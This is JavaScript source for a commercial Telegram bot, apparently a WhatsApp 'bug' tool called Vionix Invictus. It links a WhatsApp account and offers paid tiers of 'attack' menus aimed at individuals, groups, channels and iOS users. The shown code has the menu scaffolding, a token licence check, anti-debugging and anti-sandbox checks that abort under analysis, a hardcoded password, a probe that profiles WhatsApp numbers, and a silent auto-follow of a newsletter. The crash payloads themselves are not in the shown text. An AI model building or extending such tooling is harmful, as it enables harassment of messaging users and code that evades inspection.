////////////////END TOOLS ANTI BIPEES////////////////
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const fetch = require("node-fetch");
const JsConfuser = require("js-confuser");
const readline = require('readline');
const vm = require('vm');
const { spawn } = require('child_process');
const os = require("os");
const { BOT_TOKEN, OWNER_IDS } = require("./settings.js");
const crypto = require("crypto");
const verifiedUsers = new Set();
const OTP_CODE = "priasolo";
const groupMembers = {};
const sessionPath = './session';
let bots = [];
let daftarBotAnak = {}; 
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// === Path File ===
const premiumFile = "./Database/premiums.json";
const adminFile = "./Database/admins.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};
// ===== FUNCTION CEK ADMIN GB =====
async function isAdmin(ctx) {
    const member = await ctx.getChatMember(ctx.from.id);
    return ["administrator", "creator"].includes(member.status);
}
// === Fungsi Loading Menu ===
async function LoadingViper(ctx) {
    const frames = [
        "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐘 𝐒 𝐓 𝐄 𝐌 🕘",
        "░░░░░░░░░░░░░░░ 0%",
        "▓▓▓░░░░░░░░░░░░ 11%",
        "▓▓▓▓▓▓░░░░░░░░░ 25%",
        "▓▓▓▓▓▓▓▓▓░░░░░░ 41%",
        "▓▓▓▓▓▓▓▓▓▓▓▓░░░ 84%",
        "▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 95%",
        "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100%",
        "𝐋 𝐎 𝐀 𝐃 𝐈 𝐍 𝐆 - 𝐒 𝐔 𝐂 𝐂 𝐄 𝐒 ✅"
    ];

    // Kirim pesan awal
    const msg = await ctx.reply(frames[0]);

    // Loop untuk animasi
    for (let i = 1; i < frames.length; i++) {
        await new Promise(res => setTimeout(res, 500)); // delay 500ms
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msg.message_id,
            null,
            frames[i]
        ).catch(() => {});
    }

    // Hapus pesan setelah selesai loading
    await ctx.deleteMessage(msg.message_id).catch(() => {});

    return msg.message_id;
}
async function ultraRealChecker(sock, number) {
    try {
        const clean = number.replace(/[^0-9]/g, "");
        const jid = clean + "@s.whatsapp.net";

        // 1️⃣ cek terdaftar
        const reg = await sock.onWhatsApp(jid);

        if (!reg || reg.length === 0) {
            return {
                status: "❌ NOT REGISTERED",
                banned: "—",
                business: "—",
                verified: "—",
                note: "Nomor tidak ada di WhatsApp"
            };
        }

        // 2️⃣ cek business info
        let business = "Personal";
        let verified = "Unknown";

        try {
            const biz = await sock.getBusinessProfile(jid);

            if (biz) {
                business = "Business Account";
                // estimasi verified (tidak resmi)
                if (biz.description || biz.website) {
                    verified = "Possible Verified 🟢";
                }
            }
        } catch {}

        // 3️⃣ cek profile picture (indikasi akun aktif)
        let privacy = "PRIVATE";
        try {
            await sock.profilePictureUrl(jid, "image");
            privacy = "OPEN";
        } catch {}

        return {
            status: "✅ REGISTERED",
            banned: "Not detected",
            business,
            verified,
            privacy,
            note: "Akun aktif (indikasi normal)"
        };

    } catch {
        return {
            status: "⚠️ UNKNOWN",
            banned: "Possible restricted",
            business: "?",
            verified: "?",
            privacy: "?",
            note: "Server menolak request (indikasi limit/restricted)"
        };
    }
}
// === Fungsi Admin / Premium ===
const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let tokenValidated = true; // volatile gate: require token each restart

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
// ==== GLOBAL LOCK: block everything until tokenValidated === true ====
function getSnippet(lines, line, range = 2) {
  const start = Math.max(0, line - range - 1)
  const end = Math.min(lines.length - 1, line + range - 1)
  let out = []

  for (let i = start; i <= end; i++) {
    const mark = i + 1 === line ? "👉" : "  "
    out.push(`${mark} ${i + 1} | ${lines[i]}`)
  }
  return out.join("\n")
}
// ===== HTML ANALISIS ERROR PADA CEKFUNC=====
const escapeHTML = (str) =>
  str.replace(/[&<>]/g, (m) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;'
  }[m]));
// ===== GTW LOADING INI BUAT APA =====
async function progress(ctx) {
  const steps = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ]

  let msg = await ctx.reply(
    "📝 Sedang Memuat Menu...\n```▱▱▱▱▱▱▱▱▱▱ 0%```",
    { parse_mode: "Markdown" }
  )

  for (const bar of steps) {
    await new Promise(r => setTimeout(r, 300))
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      null,
      `🔎 Verification Start, Wait...\n\`\`\`${bar}\`\`\``,
      { parse_mode: "Markdown" }
    )
  }
}

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomimage = [
"https://files.catbox.moe/zrhmp1.jpg"
];

const getRandomImage = () =>
  randomimage[Math.floor(Math.random() * randomimage.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/jbrfourtyexten-creator/Dbswat/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

console.log(chalk.bold.blue("Sedang Mengecek Database..."));

//BYPASS
//Hapus Axios asli lu ganti punya gw dibawah ini
const axios = require('axios');

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.abort();
  }

  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (suki terdeteksi)`);
    process.abort();
  }

  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.abort();
  }

  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.abort();
  }

  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.abort();
  }

  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.abort();
  }

  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );

  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.abort();
  }

} catch (err) {
  console.error(`[SECURITY] BYPASS MU AMPAZ DEK 🤓 ./SENNN`, err);
  process.abort();
}
console.log("MEMVERIFIKASI.....");

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("TOKEN ANDA TIDAK TERDAFTAR DI DATA BASE !!!"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }
  console.log(chalk.green(`[!] From System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini.\n`));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⢉⠀⠀⠀⠿⠦⠤⢦⣍⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⣤⡞⢡⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣤⠴⠒⣾⠿⢟⠛⠻⣿⡿⣭⠿⠁⢰⠰⠀⠀⠀⠄⣄⣀⡀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⣿⣦⡀⠙⠛⠋⠀⠀⠉⠻⠿⢷⣦⣿⣤⣤⣤⣤⣀⣈⠉⠛⠽⣆⡒⣿⣯⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠻⣍⠻⠿⣿⣦⣄⡀⢠⣾⠑⡆⠀⠈⠉⠛⠛⢿⡿⠿⠿⢿⣿⣿⣿⣿⠟⠉⠉⢿⣟⢲⢦⣀⠀⠀
⠀⠀⠈⠙⠲⢤⣈⠉⠛⠷⢿⣏⣀⡀⠀⠀⠀⢰⣏⣳⠀⠀⠀⠀⠀⣸⣓⣦⠀⠀⠈⠛⠟⠃⣈⣷⡀
⠀⠀⠀⠀⠀⠈⢿⣙⡓⣶⣤⣤⣀⡀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠹⣿⣯⣤⣶⣶⣶⣿⠘⡿⢸⡿
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⡛⠻⢿⣯⣽⣷⣶⣶⣤⣤⣤⣤⣄⣀⣀⢀⣀⢀⣀⣈⣥⡤⠶⠗⠛⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠲⣬⣍⣉⡉⠙⠛⠛⠛⠉⠙⠉⠙⠉⣹⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⠗⠒⠒⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
███████╗███████╗███╗   ██╗███╗   ██╗
██╔════╝██╔════╝████╗  ██║████╗  ██║
███████╗█████╗  ██╔██╗ ██║██╔██╗ ██║
╚════██║██╔══╝  ██║╚██╗██║██║╚██╗██║
███████║███████╗██║ ╚████║██║ ╚████║
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝⠀       
      `));
  console.log(
    chalk.bold.green(`
[!] System: Token Kamu Terdaftar Dalam Database! Terimakasih Sudah Membeli Script Ini
───────────────────────────
© V I P E R - I N V I C T U S
`));
}

validateToken();
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder default
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("120363404346089748@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========MENU UTAMA========\\\\
bot.command("password", (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.split(" ").slice(1);
  const userOtp = args.join(" ");
  
  if (!userOtp) return ctx.reply("❌ Enter The Password");

  if (userOtp !== OTP_CODE)
    return ctx.reply("❌ Invalid Password.");
  
  verifiedUsers.add(chatId);
  ctx.reply("✅ Verification Successful. Access Granted. Please Type /start Again.");
});

bot.command("start", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  await LoadingViper(ctx);
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ sennsofhopee.t.me あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tʀᴀsʜ ☇ Mᴇɴᴜ",
        callback_data: "attackmenu_menu",
      },
      {
        text: "Mᴅ ☇ Mᴇɴᴜ",
        callback_data: "group_menu",
      },
    ],
    [
      {
        text: "Tʜᴀɴᴋs ☇ Tᴏ",
        callback_data: "thanks_menu",
      },
    ],
    [
      {
        text: "Cᴏɴᴛʀᴏʟ ☇ Mᴇɴᴜ",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "Bᴜʏ ☇ Sᴄʀɪᴘᴛ",
        callback_data: "buy_menu",
      },      
    ],
    [
      {
        text: "Oᴡɴᴇʀ ☇ Sᴄʀɪᴘᴛ",
        url: "https://t.me/Raffioffci2",
      },      
      {
        text: "Cʜᴀɴɴᴇʟ ☇ Oᴡɴᴇʀ",
        url: "https://t.me/senn_official",
      },
    ],
    [
      {
        text: "➕ Aᴅᴅ ☇ Bᴏᴛ ",
        url: "https://t.me/sennjboaddbot?startgroup=false",        },           
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.action("attackmenu_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage =`<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ sennsofhopee.t.me あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Aᴛᴛᴀᴄᴋ V1 ☇ Mᴇɴᴜ",
        callback_data: "bug_menu",
      },
      {
        text: "Aᴛᴛᴀᴄᴋ V2 ☇ Mᴇɴᴜ",
        callback_data: "bug_menu2",
      },
    ],
    [
      {
        text: "Uɪ ☇ Mᴇɴᴜ",
        callback_data: "ui_menu",
      },
    ],
    [
      {
        text: "iOs ☇ Mᴇɴᴜ",
        callback_data: "other_menu",
      },    
      {
        text: "Sᴘᴇᴄɪᴀʟ ☇ Mᴇɴᴜ",
        callback_data: "jmbud_menu",
      },    
    ],
    [
      {
        text: "Sᴇᴄʀᴇᴛ ☇ Mᴇɴᴜ",
        callback_data: "plerr_menu",
      },                       
    ],
    [
      {
        text: "Aᴛᴛᴀᴄᴋ Gʙ ☇ Mᴇɴᴜ",
        callback_data: "grup_menu",
      },              
      {
        text: "Aᴛᴛᴀᴄᴋ Cʜ ☇ Mᴇɴᴜ",
        callback_data: "bukceha_menu",
      },
    ],
    [
      {
        text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ",
        callback_data: "back",                    
      },                       
    ],
  ];
  
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});

bot.action("group_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
    
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "On Boss"
      : "Ga On Jir"; 
      
  const mainMenuMessage = `<blockquote><strong>⏤ ( 🍂 ) — こんにちは ${Name}!</strong></blockquote>
<blockquote><strong>自己紹介させてください。私は Vionix Invictus 38.0.0 – Limited Edition です現在、次世代システムとして正式リリースされていますこれは最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ sennsofhopee.t.me あなたが求めていた “力” です</strong></blockquote>
<blockquote><strong>⏤ 𝖳𝗁𝖾 𝖡𝗈𝗍 Ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 » @Raffioffci2
⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 » Vionix Invictus
⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 » 38.0.0 • Limited Edition
⫹⫺ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 » JavaScript
⫹⫺ 𝗙𝗿𝗮𝗺𝗲𝘄𝗼𝗿𝗸 » Telegraf.Js
⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀 » Online
<blockquote><strong>⏤ 𝖲𝗍𝖺𝗍𝗎𝗌 𝖡𝗈𝗍𝗌 ϟ 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇</strong></blockquote>
⫹⫺ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 » ${Name}
⫹⫺ 𝗦𝗲𝗻𝗱𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 » ${waStatus}
⫹⫺ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲 » ${waktuRunPanel}
⫹⫺ 𝗗𝗮𝘁𝗲 » ${new Date().toLocaleDateString()}
⫹⫺ 𝗥𝗼𝗹𝗲 𝗨𝘀𝗲𝗿𝘀 ${isPremium ? "👑 Premium User" : "💸 Free User"}
⫹⫺ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 » Limited Access Enabled
⫹⫺ 𝗘𝗱𝗶𝘁𝗶𝗼𝗻 » Official Release
<blockquote><strong>( Ϟ ) Please select a button menu below!!!</strong></blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "Tᴏᴏʟs ☇ Mᴇɴᴜ",
        callback_data: "tools_menu",
      },   
      {
        text: "Nꜱꜰᴡ ☇ Mᴇɴᴜ",
        callback_data: "nsfw_menu",
      },         
    ],
    [
      {
        text: "Fᴜɴ ☇ Mᴇɴᴜ",
        callback_data: "fun_menu",
      },
    ],
    [
      {
        text: "Dᴏᴡɴʟᴏᴀᴅ ☇ Mᴇɴᴜ",
        callback_data: "donlot_menu",
      },
    ],
    [
      {
        text: "Gʀᴏᴜᴘ ☇ Mᴇɴᴜ",
        callback_data: "md_menu",
      },
      {
        text: "Dᴇᴘʟᴏʏ ☇ Mᴇɴᴜ",
        callback_data: "deploi_menu",
      },      
    ],
    [
      {
        text: "Bᴀᴄᴋ Tᴏ Mᴇɴᴜ",
        callback_data: "back",                    
      },
    ],
  ];
    
  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
bot.action("buy_menu", async (ctx) => {
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const mainMenuMessage = `
⟣━━━━━━━━━━━━━━━━━━
<blockquote><strong>𝐋͢𝐢͜𝐬͡𝐭  ⍣᳟ 𝐇͢𝐚͜𝐫͡𝐠͢𝐚</strong></blockquote>
<blockquote><strong>🧬VIONIX INVICTUS (FIX)🧬</strong></blockquote>
     🩸Version 38.0🩸

<blockquote><strong>‣ List Harga Vionix Invictus 💸</strong></blockquote>
•No Up: 15K
•Free Up 1X: 20k
•Permanen Up: 25kK
•Reseller : 30K
•Partner : 35K
•Owner: 40K
•Tk : 45K
•Mods : 60K 
•Ceo : 85k
•Staff : 120k

<blockquote><strong>Benefit Script 🎰:</strong></blockquote>
•Menu Bug Select
•Menu Bug V1
•Menu Bug V2
•Menu Bug V3 
•Script Simple
•Bug Gb
